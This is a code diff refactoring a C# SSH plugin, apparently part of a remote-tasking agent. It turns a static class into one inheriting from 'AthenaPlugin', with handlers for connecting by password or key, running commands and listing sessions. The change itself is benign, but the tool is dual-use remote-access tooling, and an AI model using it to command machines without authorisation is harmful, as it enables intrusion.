@@ -2,14 +2,13 @@
 using Renci.SshNet;
 using System.Text;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class ssh
+    public class Plugin : AthenaPlugin
     {
-        //static SshClient sshClient;
-        static Dictionary<string, SshClient> sessions = new Dictionary<string, SshClient>();
-        static string currentSession = "";
-        public static void Execute(Dictionary<string, object> args)
+        Dictionary<string, SshClient> sessions = new Dictionary<string, SshClient>();
+        string currentSession = "";
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
@@ -63,7 +62,7 @@ namespace Plugin
                         });
                         break;
                 }
-                
+
             }
             catch (Exception e)
             {
@@ -71,7 +70,7 @@ namespace Plugin
                 return;
             }
         }
-        static ResponseResult Connect(Dictionary<string, object> args)
+        ResponseResult Connect(Dictionary<string, object> args)
         {
             ConnectionInfo connectionInfo;
             string hostname = (string)args["hostname"];
@@ -82,7 +81,7 @@ namespace Plugin
                 hostname = hostnameParts[0];
                 port = int.Parse(hostnameParts[1]);
             }
-            
+
             if (args.ContainsKey("keypath") && !String.IsNullOrEmpty((string)args["keypath"])) //SSH Key Auth
             {
                 string keyPath = (string)args["keypath"];
@@ -144,7 +143,7 @@ namespace Plugin
             }
 
         }
-        static ResponseResult Disconnect(Dictionary<string, object> args)
+        ResponseResult Disconnect(Dictionary<string, object> args)
         {
             string session;
             if (String.IsNullOrEmpty((string)args["session"]))
@@ -201,7 +200,7 @@ namespace Plugin
                 };
             }
         }
-        static ResponseResult RunCommand(Dictionary<string, object> args)
+        ResponseResult RunCommand(Dictionary<string, object> args)
         {
             StringBuilder sb = new StringBuilder();
             string command = (string)args["command"];
@@ -249,12 +248,12 @@ namespace Plugin
                 task_id = (string)args["task-id"]
             };
         }
-        static ResponseResult ListSessions(Dictionary<string, object> args)
+        ResponseResult ListSessions(Dictionary<string, object> args)
         {
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("Active Sessions");
             sb.AppendLine("--------------------------");
-            foreach(var sshClient in sessions)
+            foreach (var sshClient in sessions)
             {
                 if (sshClient.Value.IsConnected)
                 {
